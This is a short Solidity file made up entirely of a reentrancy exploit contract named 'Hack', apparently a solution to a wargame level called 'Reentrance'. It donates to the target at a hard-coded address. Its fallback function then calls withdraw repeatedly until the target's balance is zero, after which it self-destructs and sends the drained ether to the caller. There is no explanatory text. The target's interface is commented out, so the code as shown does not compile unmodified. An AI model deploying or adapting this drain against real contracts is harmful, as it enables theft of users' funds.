// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

/*

contract Reentrance {
  
  mapping(address => uint) public balances;

  function donate(address _to) public payable {}

  function balanceOf(address _who) public view returns (uint balance) {}

  function withdraw(uint _amount) public {}

  receive() external payable {}
}
*/

contract Hack {
  uint public ammount;
  uint public quantidadeTirada;
  constructor() payable public {
    ammount = msg.value;
  }

  address payable contractAddress = 0xc1EfFdac8048d2F6d4Ee04E5c48fF6B51d8fE892;
  Reentrance contractHandle = Reentrance(contractAddress);

  function donate() public {
      contractHandle.donate{value: 1000000000000000}(payable(address(this)));
  }

// Reentrance(contractAddress).function(myAddress) doesn't work
// but  Reentrance(contractAddress).function{value: ammount}(myAddress) works.

  function _withdraw() payable public {
    quantidadeTirada = ammount;
    contractHandle.withdraw(ammount);

    require(contractAddress.balance == 0, "not zero");
    selfdestruct(payable(msg.sender));
  }

  fallback() payable external {


    if (contractAddress.balance != 0) {
    contractHandle.withdraw(ammount);
    }

  }
}
